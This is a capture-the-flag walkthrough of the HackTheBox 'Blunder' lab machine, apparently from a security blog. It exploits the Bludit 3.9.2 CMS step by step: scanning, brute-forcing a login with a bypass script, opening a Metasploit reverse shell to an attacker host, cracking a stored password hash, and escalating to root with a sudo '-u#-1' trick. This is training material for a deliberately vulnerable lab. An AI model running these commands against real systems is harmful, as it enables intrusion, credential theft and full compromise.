![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_850/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-hackthebox-banner.jpg)

# Blunder HackTheBox Walkthrough

This is Blunder HackTheBox machine walkthrough. In this walkthrough I will demonstrate you how I successfully exploited this machine and got root flag. Before starting let’s know something about Blunder machine. It is a Linux machine and is given difficulty level low by it’s maker with IP address 10.10.10.191.

Now I will show you step by step procedure how to get root flag in blunder machine.

First of all connect your PC with VPN so that you can get access to the lab and ping the IP 10.10.10.191 to make confirm that you are connected with blunder machine. I started by scanning the IP address 10.10.10.191, so that I could get some hint to start. Nmap, a port scanner gave the following results.

## Scanning The Machine 

`$nmap -sC -sC -oN scan 10.10.10.191`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_965/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-hackthebox-nmap-scan1.png)

`$nmap -sC -sV -p- -oN full_scan 10.10.10.191`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_952/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-hackthebox-nmap-fullscan.png)

Port 21 and 80 is shown. Apache2 web server is running on port 80. After some enumeration found website is running on Bludit CMS. And the version is 3.9.2 from this URL http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2


As usual my next step is to search if any exploit is available for given CMS. Just googled Bludit CMS 3.9.2 exploit . For more details google CVE-2019-17240. Also searchsploit give this result.

`$searchsploit bludit`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1024/https://ethicalhacs.com/wp-content/uploads/2020/07/bludit-CMS-exploit-search-1024x168.png)

`$msfdb run`

`­­msf5>search bludit`

`msf5>show info exploit/linux/http/bludit_upload_images_exec`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1024/https://ethicalhacs.com/wp-content/uploads/2020/07/bludit-metasploit-module-search-1024x373.png)


`nikto -h 10.10.10.191`

Got file todo.txt. After reading the content at http://10.10.10.191/todo.txt it appears that fergus is the user. Added it to my note. And started further enumeration.
![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1024/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-htb-custom-wordlist-create-1024x68.png)
Creating Custom Wordlist
`$cewl -d 3 -m 5 -w custom_wordlist.txt http://10.10.10.191/`

Modify the script at https://rastating.github.io/bludit-brute-force-mitigation-bypass/ as given below. In username use fergus because we want to brute force on user fergus and in fname use the name of custom wordlist which you have created using cewl command. In my case it is custom_wordlist.txt. Save it as poc.py and run it 

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1024/https://ethicalhacs.com/wp-content/uploads/2020/07/bludit-bruteforce-exploit-poc-1024x597.png)


Cracking Password
`$python poc.py`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_758/https://ethicalhacs.com/wp-content/uploads/2020/07/merge_from_ofoct-min.jpg)

So we have the credentials fergus : RolandDeschain . It’s time to exploit and get remote shell on our PC.


Getting User Shell
`$ msfdb run`

`msf5 > search bludit`

`msf5 > use exploit/linux/http/bludit_upload_images_exec`

`msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus`

`msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain`

`msf5 exploit(linux/http/bludit_upload_images_exec) > set payload`

`php/meterpreter/reverse_tcp`

`msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST 10.10.15.87`

`msf5 exploit(linux/http/bludit_upload_images_exec) > exploit`

`meterpreter > sysinfo`

`meterpreter > shell`

`$which python`

`$python -c 'import pty;pty.spawn("/bin/bash")'`

`$www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm-256color `

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1024/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-htb-box-sysinfo-1024x221.png)

So we are in the Blunder HTB machine. Let us grab user flag.  Inside home directory two users hugo and shaun are present. User flag is inside hugo folder. But www-data don’t have permission to read it. Only hugo has permission to read it. Tried $su hugo in case hugo and fergus have same password but login failed possibly due to incorrect password. To access user flag we have to login with hugo. After manual enumeration found a file users.php inside the directory /var/www/bludit-3.9.2/bl-content/databases/.


Got password along with its salt

    Password: bfcc887f62e36ea019e3295aafb8a3885966e265

              Salt: 5dde2887e7aca

Now we have to crack this password. Hash identifier gave it is a sha1 hash.

Identify Type Of Hash

Tried to crack using hashcat and rockyou.txt wordlist but could not crack. So tried https://cmd5.com/ site and successfully cracked the hash.

The password is Password120. So the credential is

Hugo : Password120.

Switch user to hugo

`$su hugo`

`Password: Password120`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_762/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-hackthebox-user-flag.png)

`$sudo -u#-1 /bin/bash`


`$cd /root/`

`$cat root.txt`

![](https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_511/https://ethicalhacs.com/wp-content/uploads/2020/07/blunder-htb-root-flag.png)
